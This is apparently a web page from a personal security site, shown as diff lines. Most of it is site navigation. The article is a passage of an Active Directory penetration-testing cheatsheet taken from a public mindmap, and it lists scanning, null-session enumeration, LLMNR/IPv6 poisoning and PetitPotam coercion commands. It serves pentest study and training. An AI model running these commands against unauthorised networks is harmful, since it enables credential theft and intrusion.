+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#no-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        No credentials
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#classic-quick-compromission-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Classic quick compromission methods
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#got-username-but-no-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Got username but no password
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#known-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known vulnerabilities
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cracking-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cracking hash
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-move" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Move
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#got-administrator-access-on-one-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        got administrator access on one machine
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valid-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        valid credentials
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationship-forest-to-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust relationship / Forest to Forest
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#permissions-move" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Permissions move
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../splunk/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Splunk
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../writeups/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Write-ups
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_3" id="__nav_3_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Write-ups
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/hhc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    SANS Holiday Hack Challenge
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/splunk_bots/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Splunk Boss of the SOC (BOTS)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4">
+        
+          
+          <label class="md-nav__link" for="__nav_3_4" id="__nav_3_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    OSCP
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_3_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    OSCP
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_4_1">
+        
+          
+          <label class="md-nav__link" for="__nav_3_4_1" id="__nav_3_4_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Proving Grounds
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_4_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_4_1">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Proving Grounds
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/access/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Access
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/algernon/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Algernon
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/astronaut/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Astronaut
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/authby/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Authby
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/blackgate/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Blackgate
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/boolean/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Boolean
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/clue/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Clue
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/cockpit/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Cockpit
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/codo/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Codo
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/craft/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Craft
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/crane/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Crane
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/dvr4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Dvr4
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/exfiltrated/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Exfiltrated
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/extplorer/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Extplorer
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/fired/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Fired
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/heist/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Heist
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/hepet/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hepet
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/hub/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hub
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/hutch/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Hutch
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/image/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Image
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/internal/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Internal
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/jacko/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Jacko
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/kevin/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Kevin
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/lavita/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lavita
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/law/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Law
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/levram/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Levram
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/muddy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Muddy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/nickel/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Nickel
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/pc/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pc
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/pelican/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Pelican
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/press/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Press
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/resourced/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Resourced
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/scrutiny/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Scrutiny
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/shenzi/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Shenzi
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/squid/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Squid
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../writeups/offsec/proving_grounds/twiggy/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Twiggy
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4">
+        
+          
+          <div class="md-nav__link md-nav__container">
+            <a href="../../projects/" class="md-nav__link ">
+              
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Projects
+  
+
+    
+  </span>
+  
+  
+
+            </a>
+            
+              
+              <label class="md-nav__link " for="__nav_4" id="__nav_4_label" tabindex="0">
+                <span class="md-nav__icon md-icon"></span>
+              </label>
+            
+          </div>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Projects
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2">
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Lab
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Security Lab
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../projects/security_lab/architecture/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Lab Architecture
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../projects/security_lab/sec_onion/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Security Onion Overview
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2_3">
+        
+          
+          <label class="md-nav__link" for="__nav_4_2_3" id="__nav_4_2_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Research
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_4_2_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Research
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../projects/security_lab/research/anyfix/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    AnyFix Technique
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+        
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3">
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Generative AI
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    Generative AI
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix="">
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../projects/genai/intel_digest_workflow/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Daily Intelligence Digest Automation (n8n)
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../projects/genai/intel_rag/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    Threat Actor RAG and Assessment
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc">
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix="">
+      
+        <li class="md-nav__item">
+  <a href="#no-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        No credentials
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#classic-quick-compromission-methods" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Classic quick compromission methods
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#got-username-but-no-password" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Got username but no password
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#known-vulnerabilities" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Known vulnerabilities
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#cracking-hash" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Cracking hash
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#privilege-escalation" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Privilege escalation
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#lateral-move" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Lateral Move
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#got-administrator-access-on-one-machine" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        got administrator access on one machine
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#valid-credentials" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        valid credentials
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#trust-relationship-forest-to-forest" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Trust relationship / Forest to Forest
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#permissions-move" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        Permissions move
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="Navigation">
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    Home
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../oscp/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    Cheatsheets
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+  
+  
+
+
+<h1 id="active-directory">Active Directory<a class="headerlink" href="#active-directory" title="Permanent link">¶</a></h1>
+<p>Extracted from the Orange Cyberdefense "Pentest Active Directory" <a class="glightbox" data-type="image" data-width="auto" data-height="auto" href="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg" data-desc-position="bottom"><img alt="mindmap" src="https://orange-cyberdefense.github.io/ocd-mindmaps/img/pentest_ad_dark_2022_11.svg"></a> SVG, grouped by the dashed boxes (sections) in the diagram. Each bullet is one node's text as it appears in the diagram (short labels like "Admin" or "scan" mark flow/decision points between commands, not commands themselves).</p>
+<h2 id="no-credentials">No credentials<a class="headerlink" href="#no-credentials" title="Permanent link">¶</a></h2>
+<ul>
+<li><code>cme smb &lt;ip_range&gt; # enumerate smb hosts</code></li>
+<li><code>nmap -sP -p &lt;ip&gt; # ping scan</code></li>
+<li><code>nmap -PN -sV --top-ports 50 --open &lt;ip&gt; # quick scan</code></li>
+<li><code>nmap -PN --script smb-vuln* -p139,445 &lt;ip&gt; # search smb vuln</code></li>
+<li>Scan Network</li>
+<li>find vulnerable host</li>
+<li><code>nmap -PN -sC -sV -oA &lt;output&gt; &lt;ip&gt; # classic scan</code></li>
+<li><code>nmap -PN -sC -sV -p- -oA &lt;output&gt; &lt;ip&gt; # full scan</code></li>
+<li><code>nmap -sU -sC -sV -oA &lt;output&gt; &lt;ip&gt; # udp scan</code></li>
+<li>nmcli dev show eth0 # show domain name &amp; dns</li>
+<li>Find DC IP</li>
+<li><code>nslookup -type=SRV _ldap._tcp.dc._msdcs.&lt;domain&gt;</code></li>
+<li><code>dig axfr &lt;domain_name&gt; @&lt;name_server&gt;</code></li>
+<li>zone transfer</li>
+<li><code>enum4linux -a -u "" -p "" &lt;dc-ip&gt; &amp;&amp; enum4linux -a -u "guest" -p "" &lt;dc-ip&gt;</code></li>
+<li><code>smbmap -u "" -p "" -P 445 -H &lt;dc-ip&gt; &amp;&amp; smbmap -u "guest" -p "" -P 445 -H &lt;dc-ip&gt;</code></li>
+<li><code>smbclient -U '%' -L //&lt;dc-ip&gt; &amp;&amp; smbclient -U 'guest%' -L //&lt;dc-ip&gt;</code></li>
+<li>List guest access on smb share</li>
+<li><code>cme smb &lt;ip&gt; -u '' -p '' # enumerate null session</code></li>
+<li><code>cme smb &lt;ip&gt; -u 'a' -p '' # enumerate anonymous access</code></li>
+<li><code>nmap -n -sV --script "ldap* and not brute" -p 389 &lt;dc-ip&gt;</code></li>
+<li>user found</li>
+<li>Enumerate ldap</li>
+<li><code>ldapsearch -x -h &lt;ip&gt; -s base</code></li>
+<li><code>enum4linux -U &lt;dc-ip&gt; | grep 'user:'</code></li>
+<li><code>cme smb &lt;ip&gt; --users</code></li>
+<li><code>net rpc group members 'Domain Users' -W '&lt;domain&gt;' -I '&lt;ip&gt;' -U '%'</code></li>
+<li>Find user list</li>
+<li><code>nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='&lt;domain&gt;',userdb=&lt;users_list_file&gt;" &lt;ip&gt;</code></li>
+<li>OSINT - enumerate username on internet</li>
+<li><code>responder -I eth0 (use --lm to force lm downgrade) # disable smb &amp; http if relay</code></li>
+<li>🔥 LLMNR / NBTNS/ MDNS</li>
+<li>Poisoning SMB -&gt; HTTP -&gt;</li>
+<li>IPV6 prefered to IPV4</li>
+<li><code>mitm6 -d &lt;domain&gt;</code></li>
+<li>poisoning</li>
+<li>ARP poisoning</li>
+<li>bettercap</li>
+<li><code>PetitPotam.py -d &lt;domain&gt; &lt;listener_ip&gt; &lt;target_ip&gt;</code></li>
+<li>coerce SMB -&gt;</li>
+<li>coerce</li>
+<li>Unauthent PetitPotam (CVE-2022-26925)</li>
+</ul>
